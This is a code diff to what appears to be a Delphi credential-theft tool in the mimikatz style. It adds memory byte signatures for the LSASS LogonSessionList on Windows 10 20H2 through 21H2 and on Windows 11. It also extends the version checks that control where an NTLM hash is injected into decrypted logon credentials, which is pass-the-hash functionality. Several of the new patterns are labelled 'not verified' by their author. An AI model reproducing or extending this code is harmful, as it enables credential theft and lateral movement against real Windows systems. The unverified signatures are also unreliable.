@@ -526,6 +526,7 @@ const
   PTRN_WN61_LogonSessionList:array [0..11] of byte=($33, $f6, $45, $89, $2f, $4c, $8b, $f3, $85, $ff, $0f, $84);
   PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
+  PTRN_WN11_LogonSessionList:array [0..12] of byte= ($45, $89, $34, $24, $4c, $8b, $ff, $8b, $f3, $45, $85, $c0, $74);
 //x86
 PTRN_WN51_LogonSessionList_x86:array [0..6] of byte= ($ff, $50, $10, $85, $c0, $0f, $84);
 PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
@@ -602,6 +603,32 @@ begin
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         patch_pos:=23;
         end;
+     if (pos('-20H2',winver)>0)  then //win10     //not verified
+        begin
+        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
+        patch_pos:=23;
+        end;
+     if (pos('-21H1',winver)>0)  then //win10     //not verified
+        begin
+        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
+        patch_pos:=23;
+        end;
+     if (copy(winver,1,4)='10.0') and (pos('-21H2',winver)>0)  then //win10     //not verified
+        begin
+        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
+        patch_pos:=23;
+        end;
+
+     if (copy(winver,1,4)='11.0') and (pos('-21H2',winver)>0)  then //win11     //not verified
+        begin
+        setlength(pattern,sizeof(PTRN_WN11_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN11_LogonSessionList[0],sizeof(PTRN_WN11_LogonSessionList));
+        patch_pos:=24;
+        end;
+
      end;
   if (lowercase(osarch)='x86') then
         begin
@@ -817,7 +844,8 @@ begin
                                           //log(winver);
                                           if (pos('-1903',winver)>0) or (pos('-1803',winver)>0) or (pos('-1703',winver)>0) or
                                              (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0) or
-                                             (pos('-2004',winver)>0)
+                                             (pos('-2004',winver)>0) or
+                                             (pos('-20H2',winver)>0) or (pos('-21H1',winver)>0) or (pos('-21H2',winver)>0)
                                              then
                                              begin
                                              log('after windows10 post 1703 (incl.)');
@@ -841,7 +869,8 @@ begin
                                           {$ifdef CPU64}
                                           if (pos('-1903',winver)>0) or (pos('-1803',winver)>0) or (pos('-1703',winver)>0) or
                                              (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0) or
-                                             (pos('-2004',winver)>0)
+                                             (pos('-2004',winver)>0) or
+                                             (pos('-20H2',winver)>0) or (pos('-21H1',winver)>0) or (pos('-21H2',winver)>0)
                                              then PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash:=HexaStringToByte(hash)
                                              else PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
                                           {$endif CPU64}
